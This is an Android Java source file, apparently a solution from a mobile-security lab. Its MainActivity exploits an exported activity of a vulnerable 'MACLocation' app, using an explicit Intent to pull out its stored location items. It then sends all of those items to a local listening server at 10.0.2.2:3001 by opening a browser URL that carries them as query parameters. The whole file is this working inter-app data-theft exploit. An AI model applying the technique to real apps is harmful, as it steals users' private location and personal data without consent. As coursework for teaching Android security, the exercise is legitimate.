package lbs.lab.macintent;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;

import java.util.ArrayList;

import lbs.lab.maclocation.Item;

// ************************************************************
// ** Read and edit this file *********************************
// ************************************************************

/**
 * Activity that should get data via an Intent, then exfiltrate it through the browser.
 */
public class MainActivity extends AppCompatActivity {

    // unique code for the request Intent
    private static final int CODE = 6;

    private static final String ITEM_ACTION = "ITEM_ACTION";
    private static final String GET_ITEMS_ACTION = "GET_ITEMS_ACTION";
    private static final String ITEMS_GET = "ITEMS_GET";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    /**
     * This function is called when the button is clicked, and should start the process
     * of exploiting the vulnerable MACLocation application through an Intent.
     * @param view - the button clicked
     */
    public void act(View view) {
        Intent i = new Intent(Intent.ACTION_MAIN);
        i.setComponent(new ComponentName(
            "lbs.lab.maclocation",
            "lbs.lab.maclocation.DatabaseActivity"
        ));
        i.setType("lbs.lab.maclocation.DatabaseActivity");
        i.putExtra(ITEM_ACTION, GET_ITEMS_ACTION);
        startActivityForResult(i, CODE);
    }

    @Override
    protected void onActivityResult(
        int requestCode,
        int resultCode,
        Intent data
    ) {
        // once the MACLocation Activity has received the intent in act()
        // we have to handle the data we receive back
        // do this in the same way we exfiltrated data before
        ArrayList<Item> items = data.getExtras()
                                    .getParcelableArrayList(ITEMS_GET);
        StringBuilder payload = new StringBuilder();
        for (Item item : items) {
            payload
                .append(Uri.encode(item.getTitle()))
                .append("=")
                .append(Uri.encode(item.getInfo()))
                .append("&");
        }
        Intent intent = new Intent(
            Intent.ACTION_VIEW,
            Uri.parse("http://10.0.2.2:3001/?" + payload)
        );
        startActivity(intent);
    }
}
